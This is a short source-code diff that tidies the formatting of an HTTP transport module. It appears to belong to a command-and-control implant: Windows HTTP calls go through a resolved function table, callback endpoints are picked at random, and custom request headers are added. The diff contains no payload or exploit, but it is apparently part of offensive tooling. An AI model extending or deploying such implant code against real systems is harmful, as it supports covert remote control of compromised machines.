@@ -11,12 +11,10 @@ namespace Http {
         uint32_t total = 0;
         uint32_t length = 0;
         do {
-            if (!(Ctx->win32.WinHttpQueryDataAvailable(request, R_CAST(LPDWORD, &length)))) {
+            if (!Ctx->win32.WinHttpQueryDataAvailable(request, R_CAST(LPDWORD, &length))) {
                 return_defer(ntstatus);
             }
-            if (!buffer) {
-                buffer = x_malloc(length + 1);
-            }
+            if (!buffer) { buffer = x_malloc(length + 1); }
 
             if (!download) {
                 download = x_malloc(length + 1);
@@ -42,7 +40,7 @@ namespace Http {
         defer:
     }
 
-    VOID DestroyRequestContext(_request_context *req_ctx) {
+    VOID DestroyRequestContext(const _request_context *req_ctx) {
         HEXANE
 
         if (req_ctx) {
@@ -84,7 +82,7 @@ namespace Http {
         if (Ctx->transport.http->endpoints) {
             RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
 
-            req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint) + 1) * sizeof(wchar_t)));
+            req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t)));
             x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
         }
 
@@ -214,7 +212,6 @@ namespace Http {
                 if (!(header = Ctx->transport.http->headers[n_headers])) {
                     break;
                 }
-
                 if (!Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                     return_defer(ntstatus);
                 }
